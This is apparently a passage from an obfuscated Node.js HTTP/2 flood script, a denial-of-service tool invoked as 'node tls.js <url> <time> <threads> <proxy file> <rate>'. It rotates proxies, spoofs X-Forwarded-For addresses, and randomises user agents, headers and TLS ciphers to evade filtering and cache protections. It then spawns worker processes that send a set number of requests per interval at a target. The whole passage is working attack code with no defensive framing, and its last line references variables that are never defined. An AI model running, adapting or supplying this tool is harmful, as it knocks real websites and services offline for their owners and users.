'uz-Latn-UZ,uz;q=0.9', 'EPIPE', 'Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00', 'controling', '012345', 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA', 'text/css', 'request', 'ECDHE-RSA-AES128-SHA256', 'nn-NO,nn;q=0.9', 'zu-ZA,zu;q=0.8', 'document', 'gzip, identity', 'lv-LV,lv;q=0.9', 'https://www.sass-lang.com', 'ECONNRESET', 'https://www.microsoft.com', 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', 'node tls.js  <url> <time> <threads> <proxy file> <rate>', 'el-GR,el;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml', 'https://www.un.org', 'match', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'https://www.jquery.com', 'https://www.npr.org', 'fil-PH,fil;q=0.8', 'XMLHttpRequest', 'navigate', 'xh-ZA,xh;q=0.8', 'https://www.reddit.com', 'push', 'no-cors', 'zh-HK,zh;q=0.9', '2263435BLzaHz', 'ETIMEDOUT', 'https://www.mozilla.org', 'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel', 'countrys', 'ENETRESET', 'application/x-pkcs7-certreqresp', 'id-ID,id;q=0.9', 'TimeoutError', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv', 'ECDHE-ECDSA-AES128-SHA', 'tk-TM,tk;q=0.8', 'ECDHE-RSA-AES256-SHA384', 'Android', 'utf8', '14AAPCNw', 'https://www.thedailybeast.com', 'no-transform', 'ENETUNREACH', 'TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', 'url', 'parseCIDR', 'en-US,en;q=0.9', 'ecdsa_brainpoolP512r1tls13_sha512', 'https://www.hrw.org', '32658dOJlPi', 'ms-MY,ms;q=0.9', 'application/graphql, application/json; q=0.8, application/xml; q=0.7', 'zgh-MA,zgh;q=0.8', 'https://www.facebook.com', 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', '1034092TkdJVm', 'application/x-pem-file', 'https://www.apache.org', '34jRnKRE', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'name', 'sw-KE,sw;q=0.9', 'exit', 'https://www.reactjs.org', 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/x-x509-user-cert', 'ja-JP,ja;q=0.9', 'image/bmp', 'en-ZA,en;q=0.9', 'ENONET', 'unhandledRejection', 'EMLINK', 'en-NZ,en;q=0.9', '583116CkVKCP', 'uz-Cyrl-UZ,uz;q=0.8', 'EPERM', 'de-DE,de;q=0.9', 'https://www.colbertnation.com', 'CERT_HAS_EXPIRED', 'application/javascript', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0'];
    _0x3ee2 = function () {
        return _0x48e076;
    };
    return _0x3ee2();
}
try {
    const proxyData = fs[_0x2672b1(0x321)](proxyFile, _0x2672b1(0x235));
    proxys = proxyData[_0x2672b1(0x27b)](/\S+/g);
} catch (_0x5bd7ea) {
    console[_0x2672b1(0x23d)](_0x2672b1(0x2dd), _0x5bd7ea[_0x2672b1(0x1e1)]), process[_0x2672b1(0x2ae)](0x1);
}(isNaN(rps) || rps <= 0x0) && (console[_0x2672b1(0x23d)]('number rps'), process[_0x2672b1(0x2ae)](0x1));
const proxyr = () => {
    const _0x1f11c8 = _0x2672b1;
    for (let _0x54aa37 = proxys[_0x1f11c8(0x389)] - 0x1; _0x54aa37 > 0x0; _0x54aa37--) {
        const _0x4f3099 = Math[_0x1f11c8(0x325)](Math[_0x1f11c8(0x2fa)]() * (_0x54aa37 + 0x1));
        [proxys[_0x54aa37], proxys[_0x4f3099]] = [proxys[_0x4f3099], proxys[_0x54aa37]];
    }
    return proxys[Math[_0x1f11c8(0x325)](Math['random']() * proxys['length'])];
};
if (cluster[_0x2672b1(0x331)]) {
    const currentDate = new Date();
    console[_0x2672b1(0x314)](), (console['log'](_0x2672b1(0x20e)[_0x2672b1(0x358)]), console[_0x2672b1(0x20b)]('..............' [_0x2672b1(0x2e2)]));
    for (let _ of Array[_0x2672b1(0x383)]({
            'length': thread
        })) {
        cluster[_0x2672b1(0x349)]();
    }
    setTimeout(() => process[_0x2672b1(0x2ae)](-0x1), time * 0x3e8);
} else setInterval(flood);

function flood() {
    const _0xf0de1f = _0x2672b1;
    var _0x6672b2 = url['parse'](target);
    const _0x4fbd25 = uap[Math[_0xf0de1f(0x325)](Math['floor'](Math[_0xf0de1f(0x2fa)]() * uap[_0xf0de1f(0x389)]))];
    var _0x32044b = headerFunc[_0xf0de1f(0x2f4)](),
        _0x2e027c = proxyr()[_0xf0de1f(0x25f)](':'),
        _0x1a1887 = request[_0xf0de1f(0x24b)](),
        _0x3c5774 = randomIp(),
        _0x1501cd = {
            'Cache-Control': headerFunc[_0xf0de1f(0x268)](),
            ':method': 'GET',
            ':authority': _0x6672b2[_0xf0de1f(0x36d)],
            'Accept-Encoding': headerFunc[_0xf0de1f(0x2c4)](),
            'X-Forwarded-For': _0x3c5774,
            ':scheme': _0xf0de1f(0x20f),
            'sec-ch-ua': _0x4fbd25,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': headerFunc['platforms'](),
            'User-Agent': _0x4fbd25,
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': headerFunc[_0xf0de1f(0x38f)](),
            'sec-fetch-dest': headerFunc[_0xf0de1f(0x1a2)](),
            'sec-fetch-mode': headerFunc[_0xf0de1f(0x339)](),
            'accept': headerFunc['accept'](),
            'accept-language': headerFunc[_0xf0de1f(0x303)](),
            ':path': _0x6672b2[_0xf0de1f(0x1a9)],
            'Origin': target,
            'x-access-token': xAuthToken,
            'CF-IPCountry': headerFunc[_0xf0de1f(0x28c)](),
            'Referer': headerFunc[_0xf0de1f(0x2f7)](),
            'If-Modified-Since': httpTime,
            'x-requested-with': _0xf0de1f(0x280),
            'content-type': headerFunc[_0xf0de1f(0x30c)](),
            'cf-cache-status': 'BYPASS',
            'sec-ch-ua-platform-version': _0xf0de1f(0x1c8),
            'Cookie': _0xf0de1f(0x212) + cookieValue
        };
    const _0x1b83d6 = new http['Agent']({
            'keepAlive': !![],
            'keepAliveMsecs': 0x7a120,
            'maxSockets': 0xc350,
            'maxTotalSockets': 0x2710
        }),
        _0x290a33 = {
            'host': _0x2e027c[0x0],
            'agent': _0x1b83d6,
            'port': _0x2e027c[0x1],
            'method': _0xf0de1f(0x328),
            'path': _0x6672b2[_0xf0de1f(0x36d)] + ':443',
            'headers': {
                'Host': _0x6672b2['host'],
                'Proxy-Connection': 'Keep-Alive',
                'Connection': _0xf0de1f(0x31c)
            }
        },
        _0x3c405b = http[_0xf0de1f(0x26c)](_0x290a33, _0x28ce61 => {});
    _0x3c405b['on'](_0xf0de1f(0x215), function (_0x153c65, _0xec1c37, _0x1e3391) {
        const _0x37030f = _0xf0de1f,
            _0x3d1a9d = tls[_0x37030f(0x215)]({
                'host': _0x6672b2[_0x37030f(0x36d)],
                'ciphers': _0x32044b,
                'secureProtocol': ['TLSv1_1_method', _0x37030f(0x33e), 'TLSv1_3_method'],
                'followAllRedirects': !![],
                'maxRedirects': 0xa,
                'port': 0x1bb,
                'sigals': concu,
                'secureOptions': crypto[_0x37030f(0x258)]['SSL_OP_NO_RENEGOTIATION'] | crypto[_0x37030f(0x258)][_0x37030f(0x374)] | crypto['constants']['SSL_OP_NO_SSLv2'] | crypto[_0x37030f(0x258)][_0x37030f(0x22e)] | crypto[_0x37030f(0x258)][_0x37030f(0x31b)] | crypto[_0x37030f(0x258)]['SSL_OP_NO_RENEGOTIATION'] | crypto[_0x37030f(0x258)]['SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION'] | crypto['constants'][_0x37030f(0x1b3)] | crypto['constants'][_0x37030f(0x1f7)] | crypto[_0x37030f(0x258)][_0x37030f(0x213)],
                'servername': _0x6672b2[_0x37030f(0x36d)],
                'echdCurve': _0x37030f(0x2df),
                'secure': !![],
                'Compression': ![],
                'rejectUnauthorized': ![],
                'ALPNProtocols': ['h2', _0x37030f(0x1a4), _0x37030f(0x1b0)],
                'sessionTimeout': 0x1388,
                'sessionMaxTimeout': 0xea60,
                'socket': _0xec1c37,
                'cookie': _0x1a1887
            }, () => {
                const _0x41c184 = _0x37030f;
                _0x3d1a9d[_0x41c184(0x205)](!![], 0x3c * 0x186a0);
                const _0x408e95 = http2[_0x41c184(0x215)](_0x6672b2[_0x41c184(0x23a)], {
                    'createConnection': () => _0x3d1a9d,
                    'settings': {
                        'headerTableSize': 0x10000,
                        'maxConcurrentStreams': 0x3e8,
                        'initialWindowSize': 0x600000,
                        'maxHeaderListSize': 0x40000,
                        'enablePush': ![]
                    }
                });
                _0x408e95['on']('connect', () => {
                    const _0x17ca40 = _0x41c184,
                        _0x3958c8 = setInterval(() => {
                            const _0x4b4fb3 = _0x4bd0;
                            for (let _0xa36596 = 0x0; _0xa36596 < rps; _0xa36596++) {
                                const _0x440774 = _0x408e95[_0x4b4fb3(0x26c)](_0x1501cd)['on'](_0x4b4fb3(0x38d), _0x42dbcf => {
                                    const _0x177870 = _0x4b4fb3;
                                    _0x440774[_0x177870(0x2e1)](), _0x440774[_0x177870(0x35c)]();
                                    return;
                                });
                                _0x440774[_0x4b4fb3(0x2f9)]();
                            }
                        }, process[_0x17ca40(0x356)][0x7]);
                }), _0x408e95['on'](_0x41c184(0x2e1), () => {
                    const _0x5880e2 = _0x41c184;
                    _0x408e95[_0x5880e2(0x35c)](), connection[_0x5880e2(0x35c)]();
                    return;
                }), _0x408e95['on'](_0x41c184(0x23d), _0xa3ffd8 => {
                    const _0x2123c4 = _0x41c184;
                    _0x408e95[_0x2123c4(0x35c)](), connection['destroy']();
                    return;
                });
            });
    }), _0x3c405b['end']();
}
const client = http2['connect'](parsed[_0x2672b1(0x23a)], clientOptions, function () {});